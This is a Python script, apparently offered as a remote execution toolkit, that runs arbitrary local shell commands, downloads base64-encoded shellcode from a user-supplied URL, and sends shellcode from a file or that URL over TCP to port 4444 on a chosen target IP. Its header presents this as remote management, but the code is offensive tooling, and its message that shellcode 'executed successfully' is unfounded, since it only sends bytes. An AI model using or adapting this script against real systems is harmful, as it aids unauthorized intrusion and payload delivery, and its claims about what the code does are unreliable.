#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 5th 2024
# Important Note:
#  Description:
# The provided script offers a versatile toolkit for executing commands, running local files,
# or deploying shellcode retrieved from a URL on a remote host. It employs Python's subprocess and
# socket modules to enable seamless communication between the user's machine and the target system.
# Users can input commands directly, execute local files by specifying their paths, or fetch shellcode
# from a URL for remote execution. The script validates inputs, ensuring proper execution and safeguarding
# against potential errors. With its modular design and robust error handling, this script serves as a
# flexible solution for remote management and execution tasks across various platforms.
#################################################################################################
import subprocess
import base64
import ctypes
import sys
import socket
import re
import platform

def get_code_from_url(url):
    """
    Function to retrieve shellcode from a URL

    Args:
        url (str): The URL from which to retrieve the shellcode

    Returns:
        bytes: The decoded shellcode
    """
    try:
        import requests  # Module for making HTTP requests
        response = requests.get(url)
        if response.status_code == 200:
            return base64.b64decode(response.content)  # Decode base64 encoded content
        else:
            print("Failed to retrieve shellcode from URL. Status code:", response.status_code)
            return None
    except Exception as e:
        print(f"Error occurred while retrieving shellcode: {e}")
        return None


def execute_command(command):
    """
    Function to execute a command in the shell

    Args:
        command (str): The command to execute

    Returns:
        str: Output of the command
    """
    try:
        # Run the command and capture the output
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode(sys.getdefaultencoding(), 'ignore')  # Decode bytes to string
    except subprocess.CalledProcessError as e:
        # If the command execution fails, return the error message
        return f"Error executing command: {e.output.decode(sys.getdefaultencoding(), 'ignore')}"


def run_shellcode(shellcode, target_ip):
    """
    Function to execute shellcode on a remote host

    Args:
        shellcode (bytes): The shellcode to execute
        target_ip (str): IP address of the target host
    """
    try:
        # Establish a TCP connection with the remote host
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, 4444))  # Change port if needed

        # Send shellcode to the remote host
        s.sendall(shellcode)
        s.close()
        print("Shellcode executed successfully on the remote host.")
    except Exception as e:
        print(f"Error occurred while executing shellcode on remote host: {e}")


def get_platform():
    """
    Function to get the current platform

    Returns:
        str: The current platform (windows, linux, darwin)
    """
    return sys.platform


if __name__ == '__main__':
    platform_name = get_platform()

    while True:
        user_input = input(
            "Enter 'cmd' to execute a command, 'file' to run a local file, or 'url' to run shellcode from a URL: ").strip().lower()

        if user_input == 'cmd':
            command = input("Enter command to execute: ")
            print(execute_command(command))  # Execute command and print output
        elif user_input == 'file':
            file_path = input("Enter path to the file: ").strip()
            try:
                with open(file_path, 'rb') as f:
                    shellcode = f.read()  # Read shellcode from file
                target_ip = input("Enter target IP address: ").strip()
                # Validate IP address format
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target_ip):
                    run_shellcode(shellcode, target_ip)  # Execute shellcode on remote host
                else:
                    print("Invalid IP address format. Please enter a valid IPv4 address.")
            except FileNotFoundError:
                print(f"File not found: {file_path}")
            except Exception as e:
                print(f"Error reading or executing file: {e}")
        elif user_input == 'url':
            url = input("Enter URL to shellcode: ").strip()
            # Validate URL format
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            try:
                shellcode = get_code_from_url(url)
                if shellcode:
                    target_ip = input("Enter target IP address: ").strip()
                    # Validate IP address format
                    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target_ip):
                        run_shellcode(shellcode, target_ip)  # Execute shellcode on remote host
                    else:
                        print("Invalid IP address format. Please enter a valid IPv4 address.")
            except Exception as e:
                print(f"Error occurred while executing shellcode from URL: {e}")
        else:
            print("Invalid input. Please enter 'cmd', 'file', or 'url'.")

